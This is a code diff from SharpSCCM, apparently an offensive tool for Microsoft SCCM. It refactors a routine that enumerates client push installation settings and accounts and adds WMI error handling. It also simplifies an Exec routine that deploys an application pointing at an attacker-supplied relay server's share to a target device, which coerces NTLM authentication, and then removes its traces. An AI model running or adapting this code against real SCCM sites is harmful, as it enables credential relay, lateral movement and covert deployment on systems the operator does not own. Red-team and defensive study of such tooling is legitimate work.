@@ -74,138 +74,131 @@ namespace SharpSCCM
             }
         }
 
-        public static void GetSitePushSettings(string server = null, string siteCode = null)
+        public static void GetSitePushSettings(ManagementScope wmiConnection = null)
         {
-            ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(server, null, siteCode);
             ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmiConnection, new ObjectQuery($"SELECT PropertyName, Value, Value1 FROM SMS_SCI_SCProperty WHERE ItemType='SMS_DISCOVERY_DATA_MANAGER' AND (PropertyName='ENABLEKERBEROSCHECK' OR PropertyName='FILTERS' OR PropertyName='SETTINGS')"));
-            ManagementObjectCollection results = searcher.Get();
-            foreach (ManagementObject result in results)
+            try
             {
-                if (result["PropertyName"].ToString() == "SETTINGS" && result["Value1"].ToString() == "Active")
+                ManagementObjectCollection results = searcher.Get();
+                if (results.Count > 0)
                 {
-                    Console.WriteLine("[+] Automatic site-wide client push installation is enabled");
-                }
-                else if (result["PropertyName"].ToString() == "SETTINGS" && result["Value1"].ToString() != "Active")
-                {
-                    Console.WriteLine("[+] Automatic site-wide client push installation is not enabled");
-                }
-                else if (result["PropertyName"].ToString() == "ENABLEKERBEROSCHECK" && result["Value"].ToString() == "3")
-                {
-                    Console.WriteLine("[+] Fallback to NTLM is enabled");
-                }
-                else if (result["PropertyName"].ToString() == "FILTERS")
-                {
-                    Console.WriteLine("[+] Install client software on the following computers:");
-                    if (result["Value"].ToString() == "0")
+                    foreach (ManagementObject result in results)
                     {
-                        Console.WriteLine("  Workstations and Servers (including domain controllers)");
+                        if (result["PropertyName"].ToString() == "SETTINGS" && result["Value1"].ToString() == "Active")
+                        {
+                            Console.WriteLine("[+] Automatic site-wide client push installation is enabled");
+                        }
+                        else if (result["PropertyName"].ToString() == "SETTINGS" && result["Value1"].ToString() != "Active")
+                        {
+                            Console.WriteLine("[+] Automatic site-wide client push installation is not enabled");
+                        }
+                        else if (result["PropertyName"].ToString() == "ENABLEKERBEROSCHECK" && result["Value"].ToString() == "3")
+                        {
+                            Console.WriteLine("[+] Fallback to NTLM is enabled");
+                        }
+                        else if (result["PropertyName"].ToString() == "FILTERS")
+                        {
+                            Console.WriteLine("[+] Install client software on the following computers:");
+                            if (result["Value"].ToString() == "0")
+                            {
+                                Console.WriteLine("  Workstations and Servers (including domain controllers)");
+                            }
+                            else if (result["Value"].ToString() == "1")
+                            {
+                                Console.WriteLine("  Servers only (including domain controllers)");
+                            }
+                            else if (result["Value"].ToString() == "2")
+                            {
+                                Console.WriteLine("  Workstations and Servers (excluding domain controllers)");
+                            }
+                            else if (result["Value"].ToString() == "3")
+                            {
+                                Console.WriteLine("  Servers only (excluding domain controllers)");
+                            }
+                            else if (result["Value"].ToString() == "4")
+                            {
+                                Console.WriteLine("  Workstations and domain controllers only (excluding other servers)");
+                            }
+                            else if (result["Value"].ToString() == "5")
+                            {
+                                Console.WriteLine("  Domain controllers only");
+                            }
+                            else if (result["Value"].ToString() == "6")
+                            {
+                                Console.WriteLine("  Workstations only");
+                            }
+                            else if (result["Value"].ToString() == "7")
+                            {
+                                Console.WriteLine("  No computers");
+                            }
+                        }
                     }
-                    else if (result["Value"].ToString() == "1")
+                    searcher = new ManagementObjectSearcher(wmiConnection, new ObjectQuery("SELECT Values FROM SMS_SCI_SCPropertyList WHERE PropertyListName='Reserved2'"));
+                    results = searcher.Get();
+                    foreach (ManagementObject result in results)
                     {
-                        Console.WriteLine("  Servers only (including domain controllers)");
-                    }
-                    else if (result["Value"].ToString() == "2")
-                    {
-                        Console.WriteLine("  Workstations and Servers (excluding domain controllers)");
-                    }
-                    else if (result["Value"].ToString() == "3")
-                    {
-                        Console.WriteLine("  Servers only (excluding domain controllers)");
-                    }
-                    else if (result["Value"].ToString() == "4")
-                    {
-                        Console.WriteLine("  Workstations and domain controllers only (excluding other servers)");
-                    }
-                    else if (result["Value"].ToString() == "5")
-                    {
-                        Console.WriteLine("  Domain controllers only");
-                    }
-                    else if (result["Value"].ToString() == "6")
-                    {
-                        Console.WriteLine("  Workstations only");
-                    }
-                    else if (result["Value"].ToString() == "7")
-                    {
-                        Console.WriteLine("  No computers");
-                    }
-                }
-            }
-            searcher = new ManagementObjectSearcher(wmiConnection, new ObjectQuery("SELECT Values FROM SMS_SCI_SCPropertyList WHERE PropertyListName='Reserved2'"));
-            results = searcher.Get();
-            foreach (ManagementObject result in results)
-            {
-                if (result["Values"] != null)
-                {
-                    foreach (string value in (string[])result["Values"])
-                    {
-                        Console.WriteLine($"[+] Discovered client push installation account: {value}");
+                        if (result["Values"] != null)
+                        {
+                            foreach (string value in (string[])result["Values"])
+                            {
+                                Console.WriteLine($"[+] Discovered client push installation account: {value}");
 
+                            }
+                        }
+                        else
+                        {
+                            Console.WriteLine("[+] No client push installation accounts were configured, but the server may still use its machine account");
+                        }
+                    }
+                    searcher = new ManagementObjectSearcher(wmiConnection, new ObjectQuery("SELECT * FROM SMS_SCI_SQLTask WHERE ItemName='Clear Undiscovered Clients'"));
+                    results = searcher.Get();
+                    foreach (ManagementObject result in results)
+                    {
+                        if (result["Enabled"].ToString() == "True")
+                        {
+                            Console.WriteLine($"[+] The client installed flag is automatically cleared on inactive clients after {result["DeleteOlderThan"]} days, resulting in reinstallation if automatic site-wide client push installation is enabled");
+                        }
+                        else
+                        {
+                            Console.WriteLine("[+] The client installed flag is not automatically cleared on inactive clients, preventing automatic reinstallation");
+                        }
                     }
                 }
-                else
-                {
-                    Console.WriteLine("[+] No client push installation accounts were configured, but the server may still use its machine account");
-                }
             }
-            searcher = new ManagementObjectSearcher(wmiConnection, new ObjectQuery("SELECT * FROM SMS_SCI_SQLTask WHERE ItemName='Clear Undiscovered Clients'"));
-            results = searcher.Get();
-            foreach (ManagementObject result in results)
+            catch (UnauthorizedAccessException ex)
             {
-                if (result["Enabled"].ToString() == "True")
-                {
-                    Console.WriteLine($"[+] The client installed flag is automatically cleared on inactive clients after {result["DeleteOlderThan"]} days, resulting in reinstallation if automatic site-wide client push installation is enabled");
-                }
-                else
-                {
-                    Console.WriteLine("[+] The client installed flag is not automatically cleared on inactive clients, preventing automatic reinstallation");
-                }
+                Console.WriteLine($"[!] You do not have the necessary permissions to query the WMI provider: {ex.Message}");
             }
-
+            catch (ManagementException ex)
+            {
+                Console.WriteLine($"[!] An exception occurred while querying for WMI data: {ex.Message}");
+            }
         }
+
         public static void Exec (ManagementScope scope, string deviceName = null, string collectionName = null, string path = null, string relayServer = null, bool runAsUser = true)
         {
-            if ((String.IsNullOrEmpty(deviceName) && String.IsNullOrEmpty(collectionName)) || (!String.IsNullOrEmpty(deviceName) && !String.IsNullOrEmpty(collectionName)))
+            string newCollectionName = $"Devices_{Guid.NewGuid().ToString()}";
+            string newApplicationName = $"Application_{Guid.NewGuid().ToString()}";
+            NewCollection(scope, "device", newCollectionName);
+            AddDeviceToCollection(scope, deviceName, newCollectionName);
+            if (!String.IsNullOrEmpty(relayServer))
             {
-                Console.WriteLine("[!] You must specify either a device or existing collection.");
-            }
-            else if (!String.IsNullOrEmpty(relayServer) && !String.IsNullOrEmpty(path) || (String.IsNullOrEmpty(relayServer) && String.IsNullOrEmpty(path)))
-            {
-                Console.WriteLine("[!] Please specify either a path or a relay server, but not both.");
+                NewApplication(scope, newApplicationName, $"\\\\{relayServer}\\C$", runAsUser, true);
             }
             else
             {
-                if (!String.IsNullOrEmpty(deviceName))
-                {
-                    string newCollectionName = $"Devices_{Guid.NewGuid().ToString()}";
-                    string newApplicationName = $"Application_{Guid.NewGuid().ToString()}";
-                    NewCollection(scope, "device", newCollectionName);
-                    AddDeviceToCollection(scope, deviceName, newCollectionName);
-                    if (!String.IsNullOrEmpty(relayServer))
-                    {
-                        NewApplication(scope, newApplicationName, $"\\\\{relayServer}\\C$", runAsUser, true);
-                    }
-                    else
-                    {
-                        NewApplication(scope, newApplicationName, $"{path}", runAsUser, true);
-                    }
-                    NewDeployment(scope, newApplicationName, newCollectionName);
-                    Console.WriteLine("[+] Waiting 30s for new deployment to become available");
-                    System.Threading.Thread.Sleep(30000);
-                    InvokeUpdate(scope, newCollectionName);
-                    Console.WriteLine("[+] Waiting 1m for NTLM authentication");
-                    System.Threading.Thread.Sleep(60000);
-                    Console.WriteLine("[+] Cleaning up");
-                    Cleanup.RemoveDeployment(scope, newApplicationName, newCollectionName);
-                    Cleanup.RemoveApplication(scope, newApplicationName);
-                    Cleanup.RemoveCollection(scope, newCollectionName);
-                    Console.WriteLine("[+] Done!");
-                }
-                else
-                // If a collection is specified instead of a device
-                {
-                    Console.WriteLine("[!] Deploying an application to a collection has not yet been implemented. Try deploying to a single system instead.");
-                }
+                NewApplication(scope, newApplicationName, $"{path}", runAsUser, true);
             }
+            NewDeployment(scope, newApplicationName, newCollectionName);
+            Console.WriteLine("[+] Waiting 30s for new deployment to become available");
+            System.Threading.Thread.Sleep(30000);
+            InvokeUpdate(scope, newCollectionName);
+            Console.WriteLine("[+] Waiting 1m for NTLM authentication");
+            System.Threading.Thread.Sleep(60000);
+            Console.WriteLine("[+] Cleaning up");
+            Cleanup.RemoveDeployment(scope, newApplicationName, newCollectionName);
+            Cleanup.RemoveApplication(scope, newApplicationName);
+            Cleanup.RemoveCollection(scope, newCollectionName);
         }
         
         public static void InvokeLastLogonUpdate(ManagementScope scope, string collectionName)
@@ -444,7 +437,7 @@ namespace SharpSCCM
                 collection["CollectionType"] = "2";
                 collection["LimitToCollectionId"] = "SMS00001";
             }
-            else
+            else if (collectionType == "user")
             {
                 collection["CollectionType"] = "1";
                 collection["LimitToCollectionId"] = "SMS00002";
